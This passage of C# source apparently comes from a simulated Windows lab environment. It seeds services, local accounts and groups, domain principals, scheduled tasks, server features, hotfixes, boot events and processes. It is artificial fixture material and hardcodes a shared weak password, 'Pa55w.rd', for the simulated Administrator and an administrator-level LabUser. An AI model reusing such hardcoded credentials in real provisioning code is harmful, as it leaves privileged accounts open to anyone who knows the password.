                s.CanPause = p[6].Contains("p"); s.CanStop = !p[6].Contains("n"); s.Delayed = p[6].Contains("d"); s.TriggerStart = p[6].Contains("t"); s.CanShutdown = p[6].Contains("s") || s.Name == "LanmanServer" || s.Name == "Winmgmt";
                s.ServiceType = s.Exe == "svchost" || s.Exe == "lsass" ? "Win32ShareProcess" : "Win32OwnProcess";
                if (s.Exe == "svchost") s.ServiceType = "Win32OwnProcess, Win32ShareProcess";
                s.BinaryPath = s.Exe == "svchost" ? "C:\\Windows\\system32\\svchost.exe -k " + SvcGroup(s.Name) + " -p" : s.Exe == "lsass" ? "C:\\Windows\\system32\\lsass.exe" : s.Exe == "MsMpEng" ? "\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.25010.11-0\\MsMpEng.exe\"" : s.Exe == "msdtc" ? "C:\\Windows\\System32\\msdtc.exe" : s.Exe == "TrustedInstaller" ? "C:\\Windows\\servicing\\TrustedInstaller.exe" : s.Exe == "SearchIndexer" ? "C:\\Windows\\system32\\SearchIndexer.exe /Embedding" : "C:\\Windows\\System32\\" + s.Exe + ".exe";
                if (s.Name == "vmms" || s.Name == "WSearch" && IsServer) continue;               // not on these machines
                if (IsServer)
                {
                    if (s.Name == "Themes") s.StartType = "Manual";
                    if (s.Name == "wscsvc") continue;
                }
                else
                {
                    // Windows 11: a workstation, remote management and remote registry off by default
                    if (s.Name == "WinRM") s.StartType = "Manual";
                    if (s.Name == "RemoteRegistry") s.StartType = "Disabled";
                    if (s.Name == "MSDTC") s.StartType = "Manual";
                    if (s.Name == "AudioSrv") s.StartType = "Automatic";
                    if (s.Name == "LanmanServer") s.StartType = "Automatic";
                }
                Services.Add(s);
            }
        }
        static string SvcGroup(string n)
        {
            switch (n)
            {
                case "DcomLaunch": case "Power": case "PlugPlay": case "BrokerInfrastructure": case "SystemEventsBroker": return "DcomLaunch";
                case "RpcSs": case "RpcEptMapper": return "RPCSS";
                case "EventLog": case "lmhosts": case "Dhcp": case "W32Time": case "BFE": case "WinHttpAutoProxySvc": return "LocalServiceNetworkRestricted";
                case "Dnscache": case "CryptSvc": case "LanmanWorkstation": case "WinRM": case "NlaSvc": return "NetworkService";
                case "LanmanServer": case "Schedule": case "gpsvc": case "Winmgmt": case "iphlpsvc": case "Themes": case "SENS": case "ShellHWDetection": case "ProfSvc": case "UsoSvc": case "BITS": case "wuauserv": case "Appinfo": case "CertPropSvc": case "SessionEnv": return "netsvcs";
            }
            return "LocalService";
        }

        void SeedAccounts()
        {
            Func<int, string> sid = rid => MachineSid + "-" + rid;
            var t0 = InstallDate;
            Users.Add(new WinUser { Name = "Administrator", Description = "Built-in account for administering the computer/domain", Sid = sid(500), Rid = 500, HasPassword = true, Password = "Pa55w.rd", PasswordLastSet = t0.AddMinutes(3), LastLogon = IsServer ? t0.AddDays(2) : (DateTime?)null, Enabled = IsServer });
            Users.Add(new WinUser { Name = "DefaultAccount", Description = "A user account managed by the system.", Sid = sid(503), Rid = 503, Enabled = false, PasswordRequired = false });
            Users.Add(new WinUser { Name = "Guest", Description = "Built-in account for guest access to the computer/domain", Sid = sid(501), Rid = 501, Enabled = false, PasswordRequired = false, UserMayChangePassword = false, PasswordNeverExpires = true });
            Users.Add(new WinUser { Name = "WDAGUtilityAccount", Description = "A user account managed and used by the system for Windows Defender Application Guard scenarios.", Sid = sid(504), Rid = 504, Enabled = false, HasPassword = true, Password = RandomName(14), PasswordLastSet = t0.AddMinutes(1) });
            if (!IsServer) Users.Add(new WinUser { Name = "LabUser", FullName = "Lab User", Description = "", Sid = sid(1001), Rid = 1001, HasPassword = true, Password = "Pa55w.rd", PasswordLastSet = t0.AddMinutes(20), LastLogon = Now.AddDays(-3) });
            NextRid = IsServer ? 1000 : 1002;
            Action<string, int, string, string[]> grp = (n, rid, d, members) =>
            {
                var g = new WinGroup { Name = n, Sid = "S-1-5-32-" + rid, Description = d };
                foreach (var m in members)
                {
                    var p = m.Split(':');
                    g.Members.Add(new WinMember { Name = p[0].Replace("@", Name), Class = p.Length > 1 ? p[1] : "User", Source = p[0].StartsWith("LAB\\", StringComparison.Ordinal) ? "ActiveDirectory" : (p[0].StartsWith("NT AUTHORITY", StringComparison.Ordinal) ? "Unknown" : "Local"), Sid = p.Length > 2 ? p[2] : "" });
                }
                Groups.Add(g);
            };
            grp("Access Control Assistance Operators", 579, "Members of this group can remotely query authorization attributes and permissions for resources on this computer.", new string[0]);
            grp("Administrators", 544, "Administrators have complete and unrestricted access to the computer/domain", IsServer ? new[] { "@\\Administrator:User:" + sid(500), "LAB\\Domain Admins:Group:" + DomainSid + "-512" } : new[] { "@\\Administrator:User:" + sid(500), "@\\LabUser:User:" + sid(1001), "LAB\\Domain Admins:Group:" + DomainSid + "-512" });
            grp("Backup Operators", 551, "Backup Operators can override security restrictions for the sole purpose of backing up or restoring files", new string[0]);
            if (IsServer) grp("Certificate Service DCOM Access", 574, "Members of this group are allowed to connect to Certification Authorities in the enterprise", new string[0]);
            grp("Cryptographic Operators", 569, "Members are authorized to perform cryptographic operations.", new string[0]);
            grp("Device Owners", 583, "Members of this group can change system-wide settings.", new string[0]);
            grp("Distributed COM Users", 562, "Members are allowed to launch, activate and use Distributed COM objects on this machine.", new string[0]);
            grp("Event Log Readers", 573, "Members of this group can read event logs from local machine", new string[0]);
            grp("Guests", 546, "Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted", new[] { "@\\Guest:User:" + sid(501) });
            grp("Hyper-V Administrators", 578, "Members of this group have complete and unrestricted access to all features of Hyper-V.", new string[0]);
            grp("IIS_IUSRS", 568, "Built-in group used by Internet Information Services.", new[] { "NT AUTHORITY\\IUSR:User:S-1-5-17" });
            grp("Network Configuration Operators", 556, "Members in this group can have some administrative privileges to manage configuration of networking features", new string[0]);
            grp("Performance Log Users", 559, "Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer", new string[0]);
            grp("Performance Monitor Users", 558, "Members of this group can access performance counter data locally and remotely", new string[0]);
            grp("Power Users", 547, "Power Users are included for backwards compatibility and possess limited administrative powers", new string[0]);
            if (IsServer) grp("Print Operators", 550, "Members can administer printers installed on domain controllers", new string[0]);
            if (IsServer) grp("RDS Endpoint Servers", 576, "Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run.", new string[0]);
            grp("Remote Desktop Users", 555, "Members in this group are granted the right to logon remotely", new string[0]);
            grp("Remote Management Users", 580, "Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.", new string[0]);
            grp("Replicator", 552, "Supports file replication in a domain", new string[0]);
            if (IsServer) grp("Storage Replica Administrators", 582, "Members of this group have complete and unrestricted access to all features of Storage Replica.", new string[0]);
            grp("System Managed Accounts Group", 581, "Members of this group are managed by the system.", new[] { "@\\DefaultAccount:User:" + sid(503) });
            grp("Users", 545, "Users are prevented from making accidental or intentional system-wide changes and can run most applications", IsServer ? new[] { "NT AUTHORITY\\Authenticated Users:Group:S-1-5-11", "NT AUTHORITY\\INTERACTIVE:Group:S-1-5-4", "LAB\\Domain Users:Group:" + DomainSid + "-513" } : new[] { "NT AUTHORITY\\Authenticated Users:Group:S-1-5-11", "NT AUTHORITY\\INTERACTIVE:Group:S-1-5-4", "@\\LabUser:User:" + sid(1001), "LAB\\Domain Users:Group:" + DomainSid + "-513" });
        }

        /// <summary>Accounts in the lab.example.com domain that may be added to local groups (name, class, RID).</summary>
        public static readonly string[] DomainPrincipals = { "Administrator|User|500", "Guest|User|501", "krbtgt|User|502", "jdoe|User|1104", "asmith|User|1105", "bwilson|User|1106", "svc_backup|User|1107", "svc_web|User|1108",
            "Domain Admins|Group|512", "Domain Users|Group|513", "Domain Computers|Group|515", "Helpdesk|Group|1110", "Server Admins|Group|1111", "Web Admins|Group|1112", "Backup Admins|Group|1113" };

        void SeedTasks()
        {
            var t0 = InstallDate;
            Action<string, string, string, string, string, string> add = (path, name, exe, args, trig, desc) =>
            {
                var t = new WinTask { Path = path, Name = name, Description = desc, Author = "Microsoft Corporation", Builtin = true, Date = t0, UserId = "SYSTEM" };
                t.Actions.Add(new WinTaskAction { Execute = exe, Arguments = args.Length == 0 ? null : args });
                foreach (var tr in trig.Split(','))
                {
                    if (tr.Length == 0) continue;
                    var w = new WinTrigger();
                    if (tr == "boot") w.Kind = "AtStartup";
                    else if (tr == "logon") w.Kind = "AtLogOn";
                    else if (tr.StartsWith("daily", StringComparison.Ordinal)) { w.Kind = "Daily"; var hm = tr.Substring(5).Split(':'); w.Start = new DateTime(2026, 1, 12, int.Parse(hm[0]), int.Parse(hm[1]), 0); }
                    else if (tr.StartsWith("weekly", StringComparison.Ordinal)) { w.Kind = "Weekly"; var hm = tr.Substring(6).Split(':'); w.Start = new DateTime(2026, 1, 11, int.Parse(hm[0]), int.Parse(hm[1]), 0); w.Days.Add(DayOfWeek.Sunday); }
                    t.Triggers.Add(w);
                }
                if (name == "Scheduled Start" || name == "MapsToastTask") t.State = "Disabled";
                Tasks.Add(t);
            };
            add("\\", "MicrosoftEdgeUpdateTaskMachineCore", "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe", "/c", "logon,daily10:41", "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date.");
            add("\\", "MicrosoftEdgeUpdateTaskMachineUA", "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe", "/ua /installsource scheduler", "daily11:11", "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date.");
            add("\\Microsoft\\Windows\\.NET Framework\\", ".NET Framework NGEN v4.0.30319", "COM handler", "", "", "");
            add("\\Microsoft\\Windows\\.NET Framework\\", ".NET Framework NGEN v4.0.30319 64", "COM handler", "", "", "");
            add("\\Microsoft\\Windows\\AppID\\", "PolicyConverter", "%SystemRoot%\\system32\\appidpolicyconverter.exe", "", "", "Converts the software restriction policy policy from XML into binary format.");
            add("\\Microsoft\\Windows\\Application Experience\\", "Microsoft Compatibility Appraiser", "%windir%\\system32\\compattelrunner.exe", "", "daily03:07", "Collects program telemetry information if opted-in to the Microsoft Customer Experience Improvement Program.");
            add("\\Microsoft\\Windows\\Application Experience\\", "ProgramDataUpdater", "%windir%\\system32\\compattelrunner.exe", "-maintenance", "", "Collects program telemetry information if opted-in to the Microsoft Customer Experience Improvement Program");
            add("\\Microsoft\\Windows\\Autochk\\", "Proxy", "%windir%\\system32\\rundll32.exe", "/d acproxy.dll,PerformAutochkOperations", "", "This task collects and uploads autochk SQM data if opted-in to the Microsoft Customer Experience Improvement Program.");
            add("\\Microsoft\\Windows\\CertificateServicesClient\\", "SystemTask", "COM handler", "", "boot", "This task is used to start the certificate enrollment for the computer.");
            add("\\Microsoft\\Windows\\Chkdsk\\", "ProactiveScan", "COM handler", "", "", "NTFS Volume Health Scan");
            add("\\Microsoft\\Windows\\Defrag\\", "ScheduledDefrag", "%windir%\\system32\\defrag.exe", "-c -h -o -$", "weekly01:00", "This task optimizes local storage drives.");
            add("\\Microsoft\\Windows\\Diagnosis\\", "Scheduled", "COM handler", "", "", "The Windows Scheduled Maintenance Task performs periodic maintenance of the computer system by fixing problems automatically or reporting them through Security and Maintenance.");
            add("\\Microsoft\\Windows\\DiskCleanup\\", "SilentCleanup", "%windir%\\system32\\cleanmgr.exe", "/autoclean /d %systemdrive%", "", "Maintenance task used by the system to launch a silent auto disk cleanup when running low on free disk space.");
            add("\\Microsoft\\Windows\\Maintenance\\", "WinSAT", "COM handler", "", "", "Measures a system's performance and capabilities");
            if (IsServer) add("\\Microsoft\\Windows\\PLA\\", "Server Manager Performance Monitor", "%systemroot%\\system32\\rundll32.exe", "%systemroot%\\system32\\pla.dll,PlaHost \"Server Manager Performance Monitor\" \"$(Arg0)\"", "", "");
            if (IsServer) add("\\Microsoft\\Windows\\Server Manager\\", "CleanupOldPerfLogs", "%systemroot%\\system32\\cscript.exe", "/B /nologo %systemroot%\\system32\\calluxxprovider.vbs $(Arg0) $(Arg1) $(Arg2)", "", "This task cleans up old perf logs.");
            if (IsServer) add("\\Microsoft\\Windows\\Server Manager\\", "ServerManager", "%windir%\\system32\\ServerManagerLauncher.exe", "", "logon", "Task for launching Initial Configuration Tasks or Server Manager at logon.");
            add("\\Microsoft\\Windows\\SoftwareProtectionPlatform\\", "SvcRestartTask", "COM handler", "", "", "This task restarts the Software Protection Platform service when needed.");
            add("\\Microsoft\\Windows\\Time Synchronization\\", "ForceSynchronizeTime", "COM handler", "", "", "Maintains date and time synchronization on all clients and servers in the network.");
            add("\\Microsoft\\Windows\\Time Synchronization\\", "SynchronizeTime", "%windir%\\system32\\sc.exe", "start w32time task_started", "weekly01:00", "Maintains date and time synchronization on all clients and servers in the network.");
            add("\\Microsoft\\Windows\\UpdateOrchestrator\\", "Schedule Scan", "%systemroot%\\system32\\usoclient.exe", "StartScan", "daily22:14", "");
            add("\\Microsoft\\Windows\\UpdateOrchestrator\\", "Scheduled Start", "%systemroot%\\system32\\sc.exe", "start wuauserv", "", "");
            add("\\Microsoft\\Windows\\Windows Defender\\", "Windows Defender Cache Maintenance", "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25010.11-0\\MpCmdRun.exe", "-IdleTask -TaskName WdCacheMaintenance", "", "Periodic maintenance task.");
            add("\\Microsoft\\Windows\\Windows Defender\\", "Windows Defender Scheduled Scan", "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25010.11-0\\MpCmdRun.exe", "Scan -ScheduleJob -ScanTrigger 55 -IdleScheduledJob", "", "Periodic scan task.");
            add("\\Microsoft\\Windows\\WindowsUpdate\\", "Scheduled Start", "C:\\Windows\\system32\\sc.exe", "start wuauserv", "", "This task is used to start the Windows Update service when needed to perform scheduled operations such as scans.");
            add("\\Microsoft\\Windows\\Wininet\\", "CacheTask", "COM handler", "", "logon", "Wininet Cache Task");
            if (!IsServer) add("\\Microsoft\\Windows\\Maps\\", "MapsToastTask", "COM handler", "", "", "This task shows various Map related toasts");
            foreach (var t in Tasks) { t.Uri = t.FullName; if (t.Triggers.Any(x => x.Kind == "Daily" || x.Kind == "Weekly")) { t.LastRun = NextTaskTime(t, Now.AddDays(-1.2)); t.LastResult = 0; } }
            foreach (var t in Tasks) t.NextRun = NextTaskTime(t, Now);
        }

        // name|display|parent|type|state|flags(r restart, m management tool, d default sub-feature)|services|requires
        static readonly string[] FeatureData = {
            "AD-Certificate|Active Directory Certificate Services||Role|Available||",
            "ADCS-Cert-Authority|Certification Authority|AD-Certificate|Role Service|Available|d|CertSvc",
            "AD-Domain-Services|Active Directory Domain Services||Role|Available||NTDS,ADWS,Kdc",
            "DHCP|DHCP Server||Role|Available||DHCPServer",
            "DNS|DNS Server||Role|Available||DNS",
            "FileAndStorage-Services|File and Storage Services||Role|Installed||",
            "File-Services|File and iSCSI Services|FileAndStorage-Services|Role Service|Installed||",
            "FS-FileServer|File Server|File-Services|Role Service|Installed||",
            "FS-Data-Deduplication|Data Deduplication|File-Services|Role Service|Available||ddpsvc",
            "FS-DFS-Namespace|DFS Namespaces|File-Services|Role Service|Available||Dfs",
            "FS-DFS-Replication|DFS Replication|File-Services|Role Service|Available||DFSR",
            "FS-Resource-Manager|File Server Resource Manager|File-Services|Role Service|Available||SrmSvc",
            "Storage-Services|Storage Services|FileAndStorage-Services|Role Service|Installed||",
            "Hyper-V|Hyper-V||Role|Available|r|vmms",
            "Print-Services|Print and Document Services||Role|Available||",
            "Print-Server|Print Server|Print-Services|Role Service|Available|d|",
            "Remote-Desktop-Services|Remote Desktop Services||Role|Available||",
            "RDS-RD-Server|Remote Desktop Session Host|Remote-Desktop-Services|Role Service|Available|r|",
            "Web-Server|Web Server (IIS)||Role|Available||W3SVC,WAS",
            "Web-WebServer|Web Server|Web-Server|Role Service|Available|d|",
            "Web-Common-Http|Common HTTP Features|Web-WebServer|Role Service|Available|d|",
            "Web-Default-Doc|Default Document|Web-Common-Http|Role Service|Available|d|",
            "Web-Dir-Browsing|Directory Browsing|Web-Common-Http|Role Service|Available|d|",
            "Web-Http-Errors|HTTP Errors|Web-Common-Http|Role Service|Available|d|",
            "Web-Static-Content|Static Content|Web-Common-Http|Role Service|Available|d|",
            "Web-Http-Redirect|HTTP Redirection|Web-Common-Http|Role Service|Available||",
            "Web-Health|Health and Diagnostics|Web-WebServer|Role Service|Available|d|",
            "Web-Http-Logging|HTTP Logging|Web-Health|Role Service|Available|d|",
            "Web-Performance|Performance|Web-WebServer|Role Service|Available|d|",
            "Web-Stat-Compression|Static Content Compression|Web-Performance|Role Service|Available|d|",
            "Web-Security|Security|Web-WebServer|Role Service|Available|d|",
            "Web-Filtering|Request Filtering|Web-Security|Role Service|Available|d|",
            "Web-Basic-Auth|Basic Authentication|Web-Security|Role Service|Available||",
            "Web-Windows-Auth|Windows Authentication|Web-Security|Role Service|Available||",
            "Web-App-Dev|Application Development|Web-WebServer|Role Service|Available||",
            "Web-Asp-Net45|ASP.NET 4.8|Web-App-Dev|Role Service|Available||",
            "Web-Ftp-Server|FTP Server|Web-Server|Role Service|Available||",
            "Web-Mgmt-Tools|Management Tools|Web-Server|Role Service|Available|m|",
            "Web-Mgmt-Console|IIS Management Console|Web-Mgmt-Tools|Role Service|Available|m|",
            "Web-Scripting-Tools|IIS Management Scripts and Tools|Web-Mgmt-Tools|Role Service|Available||",
            "UpdateServices|Windows Server Update Services||Role|Available||WsusService",
            "WDS|Windows Deployment Services||Role|Available||WDSServer",
            "NET-Framework-45-Features|.NET Framework 4.8 Features||Feature|Installed||",
            "NET-Framework-45-Core|.NET Framework 4.8|NET-Framework-45-Features|Feature|Installed||",
            "NET-WCF-Services45|WCF Services|NET-Framework-45-Features|Feature|Installed||",
            "NET-WCF-TCP-PortSharing45|TCP Port Sharing|NET-WCF-Services45|Feature|Installed||",
            "BitLocker|BitLocker Drive Encryption||Feature|Available|r|",
            "Failover-Clustering|Failover Clustering||Feature|Available||ClusSvc",
            "GPMC|Group Policy Management||Feature|Available||",
            "Microsoft-Windows-Subsystem-Linux|Windows Subsystem for Linux||Feature|Available|r|",
            "RSAT|Remote Server Administration Tools||Feature|Available||",
            "RSAT-Role-Tools|Role Administration Tools|RSAT|Feature|Available||",
            "RSAT-AD-Tools|AD DS and AD LDS Tools|RSAT-Role-Tools|Feature|Available||",
            "RSAT-AD-PowerShell|Active Directory module for Windows PowerShell|RSAT-AD-Tools|Feature|Available||",
            "RSAT-DNS-Server|DNS Server Tools|RSAT-Role-Tools|Feature|Available||",
            "RSAT-DHCP|DHCP Server Tools|RSAT-Role-Tools|Feature|Available||",
            "FS-SMB1|SMB 1.0/CIFS File Sharing Support||Feature|Available|r|",
            "SNMP-Service|SNMP Service||Feature|Available||SNMP",
            "System-DataArchiver|System Data Archiver||Feature|Installed||",
            "Telnet-Client|Telnet Client||Feature|Available||",
            "Windows-Defender|Microsoft Defender Antivirus||Feature|Installed||",
            "PowerShellRoot|Windows PowerShell||Feature|Installed||",
            "PowerShell|Windows PowerShell 5.1|PowerShellRoot|Feature|Installed||",
            "PowerShell-V2|Windows PowerShell 2.0 Engine|PowerShellRoot|Feature|Available||",
            "PowerShell-ISE|Windows PowerShell ISE|PowerShellRoot|Feature|Installed||",
            "Windows-Server-Backup|Windows Server Backup||Feature|Available||wbengine",
            "WoW64-Support|WoW64 Support||Feature|Installed||",
            "XPS-Viewer|XPS Viewer||Feature|Installed||",
        };
        void SeedFeatures()
        {
            if (!IsServer) return;
            foreach (var line in FeatureData)
            {
                var p = line.Split('|');
                var f = new WinFeature { Name = p[0], Display = p[1], Parent = p[2].Length == 0 ? null : p[2], Type = p[3], State = p[4], Restart = p[5].Contains("r"), ManagementTool = p[5].Contains("m"), Default = p[5].Contains("d") };
                f.Services = p[6].Length == 0 ? new string[0] : p[6].Split(',');
                f.Depth = f.Parent == null ? 0 : FindFeature(f.Parent).Depth + 1;
                Features.Add(f);
            }
        }

        void SeedHotfixes()
        {
            var d = InstallDate.Date;
            if (IsServer)
            {
                Hotfixes.Add(new WinHotfix { Id = "KB5050575", Description = "Update", On = d });
                Hotfixes.Add(new WinHotfix { Id = "KB5012170", Description = "Security Update", On = d });
                Hotfixes.Add(new WinHotfix { Id = "KB5050593", Description = "Security Update", On = d.AddDays(1) });
                Hotfixes.Add(new WinHotfix { Id = "KB5051979", Description = "Security Update", On = new DateTime(2026, 2, 11) });
            }
            else
            {
                Hotfixes.Add(new WinHotfix { Id = "KB5049624", Description = "Update", On = d });
                Hotfixes.Add(new WinHotfix { Id = "KB5027397", Description = "Update", On = d });
                Hotfixes.Add(new WinHotfix { Id = "KB5050021", Description = "Security Update", On = d.AddDays(1) });
                Hotfixes.Add(new WinHotfix { Id = "KB5051989", Description = "Security Update", On = new DateTime(2026, 2, 11) });
            }
        }

        // ------------------------------------------------------------ boot and shutdown
        partial void OnBoot(bool first)
        {
            BootCount++;
            DateTime t = first ? BootTime : Now.AddSeconds(15);
            if (!first && PendingName != null) ApplyRename();
            foreach (var f in Features.Where(x => x.State == "InstallPending")) f.State = "Installed";
            foreach (var f in Features.Where(x => x.State == "UninstallPending")) f.State = "Available";
            Processes.Clear();
            foreach (var s in Services) { s.Pid = 0; if (s.Running) s.Status = "Stopped"; }
            SeedProcesses(t);
            // services: automatic ones start (with what they need), trigger-start ones that Windows usually starts
            foreach (var s in LiveServices.Where(x => x.StartType == "Automatic" || x.StartType == "System" || x.StartType == "Boot").ToList()) StartService(s, false);
            foreach (var n in new[] { "KeyIso", "Netman", "netprofm", "lmhosts", "PlugPlay", "WdiServiceHost", "CertPropSvc", "Appinfo", "VaultSvc", "SessionEnv", "WinHttpAutoProxySvc", "TermService", "wuauserv" })
            {
                var s = Svc(n);
                if (s != null && s.StartType != "Disabled" && (IsServer || n != "TermService")) StartService(s, false);
            }
            if (first) { SeedHistory(); }
            else
            {
                BootEvents(t);
                foreach (var s in LiveServices.Where(x => x.Running && x.ServiceType != "KernelDriver").Take(14)) EventAt(t.AddSeconds(8), "System", "Service Control Manager", 7036, 4, "The " + s.DisplayName + " service entered the running state.", null);
                // tasks that start with the computer
                foreach (var task in Tasks.Where(x => x.State != "Disabled" && x.Triggers.Any(tr => tr.Kind == "AtStartup" && tr.Enabled)).ToList()) RunTask(task, "boot");
            }
            foreach (var task in Tasks) if (task.State == "Running") task.State = "Ready";
            foreach (var task in Tasks) task.NextRun = NextTaskTime(task, Now);
        }

        partial void OnShutdown()
        {
            DateTime t = Now;
            EventAt(t, "System", "User32", 1074, 4, "The process C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe (" + Name + ") has initiated the " + (ShutdownKind ?? "restart") + " of computer " + Name + " on behalf of user " + DomainShort + "\\Administrator for the following reason: No title for this reason could be found\r\n Reason Code: 0x800000ff\r\n Shutdown Type: " + (ShutdownKind ?? "restart") + "\r\n Comment: ", AdminUserSid);
            EventAt(t.AddSeconds(2), "System", "Microsoft-Windows-Kernel-Power", 109, 4, "The kernel power manager has initiated a shutdown transition.\r\n\r\nShutdown Reason: Kernel API", null);
            EventAt(t.AddSeconds(3), "System", "EventLog", 6006, 4, "The Event log service was stopped.", null);
            EventAt(t.AddSeconds(4), "System", "Microsoft-Windows-Kernel-General", 13, 4, "The operating system is shutting down at system time " + SysTime(t.AddSeconds(4).ToUniversalTimeLab(UtcOffsetHours)) + ".", null);
            ShutdownKind = null;
            foreach (var s in Services) if (s.Running) { s.Status = "Stopped"; s.Pid = 0; }
        }
        public string ShutdownKind;
        static string SysTime(DateTime utc) { return utc.ToString("yyyy\\-MM\\-dd", CultureInfo.InvariantCulture) + "T" + utc.ToString("HH:mm:ss.fffffff", CultureInfo.InvariantCulture) + "00Z"; }

        void ApplyRename()
        {
            string old = Name;
            Name = PendingName; PendingName = null;
            HKLM.Sub("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName").S("ComputerName", Name);
            var h = Net.Hosts.FirstOrDefault(x => x.Machine == this);
            if (h != null)
            {
                string oldFqdn = h.Fqdn;
                h.Name = Name;
                for (int i = 0; i < Net.DnsA.Count; i++) if (Net.DnsA[i].Key.Equals(oldFqdn, StringComparison.OrdinalIgnoreCase)) Net.DnsA[i] = new KeyValuePair<string, string>(h.Fqdn, Net.DnsA[i].Value);
            }
            foreach (var g in Groups) foreach (var m in g.Members) if (m.Name.StartsWith(old + "\\", StringComparison.OrdinalIgnoreCase)) m.Name = Name + m.Name.Substring(old.Length);
        }

        void BootEvents(DateTime t)
        {
            EventAt(t, "System", "Microsoft-Windows-Kernel-General", 12, 4, "The operating system started at system time " + SysTime(t.ToUniversalTimeLab(UtcOffsetHours)) + ".", null);
            EventAt(t.AddSeconds(1), "System", "Microsoft-Windows-Kernel-Boot", 20, 4, "The last shutdown's success status was true. The last boot's success status was true.", null);
            EventAt(t.AddSeconds(4), "System", "EventLog", 6009, 4, "Microsoft (R) Windows (R) 10.00. " + OsBuild + "  Multiprocessor Free.", null);
            EventAt(t.AddSeconds(4), "System", "EventLog", 6005, 4, "The Event log service was started.", null);
            EventAt(t.AddSeconds(5), "System", "EventLog", 6013, 4, "The system uptime is 7 seconds.", null);
            EventAt(t.AddSeconds(20), "System", "Microsoft-Windows-Time-Service", 37, 4, "The time provider NtpClient is currently receiving valid time data from DC01.lab.example.com (ntp.d|10.0.10.11:123->10.0.10.10:123).", null);
            EventAt(t.AddSeconds(25), "System", "Microsoft-Windows-GroupPolicy", 1500, 4, "The Group Policy settings for the computer were processed successfully. There were no changes detected since the last successful processing of Group Policy.", "S-1-5-18");
            EventAt(t.AddSeconds(26), "Security", "Microsoft-Windows-Security-Auditing", 4608, 0, "Windows is starting up.\r\n\r\nThis event is logged when LSASS.EXE starts and the auditing subsystem is initialized.", null);
            EventAt(t.AddSeconds(27), "Application", "Microsoft-Windows-Security-SPP", 16384, 4, "Successfully scheduled Software Protection service for re-start at " + t.AddDays(1).ToUniversalTimeLab(UtcOffsetHours).ToString("yyyy-MM-ddTHH:mm:ssZ", CultureInfo.InvariantCulture) + ". Reason: RulesEngine.", null);
        }

        void SeedProcesses(DateTime boot)
        {
            Func<string, string, int, string, int, WinProcess> P = (name, path, session, user, parent) =>
            {
                var p = new WinProcess { Id = 0, Name = name, Path = path, SessionId = session, User = user, ParentId = parent, Start = boot.AddSeconds(Processes.Count), Version = OsVersion + "." + (IsServer ? "2849" : "4249") };
                p.Id = NewPid();
                p.CommandLine = path;
                p.Ws = (4 + AdminRng.Next(40)) * 1048576L + AdminRng.Next(256) * 4096; p.Pm = p.Ws * 2 / 3; p.Npm = (6 + AdminRng.Next(30)) * 1024; p.Handles = 100 + AdminRng.Next(700); p.Cpu = AdminRng.Next(500) / 100.0; p.Threads = 3 + AdminRng.Next(20);
                Processes.Add(p);
                return p;
            };
            const string sys = "NT AUTHORITY\\SYSTEM";
            string me = DomainShort + "\\Administrator";
            if (!IsServer) me = Name + "\\LabUser";
            NextPid = Math.Max(NextPid, 4000);
            var idle = new WinProcess { Id = 0, Name = "Idle", SessionId = 0, User = sys, Start = boot, Ws = 8192, Pm = 61440, Npm = 0, Handles = 0, Cpu = 0, Threads = Cpus, Protected = true, Description = "", Vm = 8192 };
            var system = new WinProcess { Id = 4, Name = "System", SessionId = 0, User = sys, Start = boot, Ws = 147456, Pm = 196608, Npm = 0, Handles = 2800 + AdminRng.Next(400), Cpu = 61.3, Threads = 140, Protected = true, Description = "", Vm = 3895296 };
            Processes.Add(idle); Processes.Add(system);
            int savedNext = NextPid;
            NextPid = 92;
            var reg = P("Registry", null, 0, sys, 4); reg.Protected = true; reg.Ws = 57577472;
            var mem = P("Memory Compression", null, 0, sys, 4); mem.Protected = true; mem.Ws = 31506432;
            NextPid = 300 + AdminRng.Next(40) * 4;
            var smss = P("smss", "C:\\Windows\\System32\\smss.exe", 0, sys, 4); smss.Protected = true; smss.Ws = 1179648;
            var csrss0 = P("csrss", "C:\\Windows\\system32\\csrss.exe", 0, sys, smss.Id); csrss0.Protected = true;
            var wininit = P("wininit", "C:\\Windows\\system32\\wininit.exe", 0, sys, smss.Id); wininit.Protected = true;
            var csrss1 = P("csrss", "C:\\Windows\\system32\\csrss.exe", 1, sys, smss.Id); csrss1.Protected = true;
            var winlogon = P("winlogon", "C:\\Windows\\system32\\winlogon.exe", 1, sys, smss.Id);
            var services = P("services", "C:\\Windows\\system32\\services.exe", 0, sys, wininit.Id); services.Protected = true;
            var lsass = P("lsass", "C:\\Windows\\system32\\lsass.exe", 0, sys, wininit.Id); lsass.Protected = true; lsass.Description = "Local Security Authority Process";
            P("fontdrvhost", "C:\\Windows\\system32\\fontdrvhost.exe", 0, "Font Driver Host\\UMFD-0", wininit.Id);
            P("fontdrvhost", "C:\\Windows\\system32\\fontdrvhost.exe", 1, "Font Driver Host\\UMFD-1", winlogon.Id);
            var dwm1 = P("dwm", "C:\\Windows\\system32\\dwm.exe", 1, "Window Manager\\DWM-1", winlogon.Id); dwm1.Description = "Desktop Window Manager";
            P("LogonUI", "C:\\Windows\\system32\\LogonUI.exe", 1, sys, winlogon.Id);
            NextPid = Math.Max(savedNext, 3000);
            int consoleSession = IsServer ? 2 : 1;
            if (IsServer)
            {
                P("csrss", "C:\\Windows\\system32\\csrss.exe", 2, sys, smss.Id).Protected = true;
                var wl2 = P("winlogon", "C:\\Windows\\system32\\winlogon.exe", 2, sys, smss.Id);
                P("dwm", "C:\\Windows\\system32\\dwm.exe", 2, "Window Manager\\DWM-2", wl2.Id).Description = "Desktop Window Manager";
                P("rdpclip", "C:\\Windows\\System32\\rdpclip.exe", 2, me, 0);
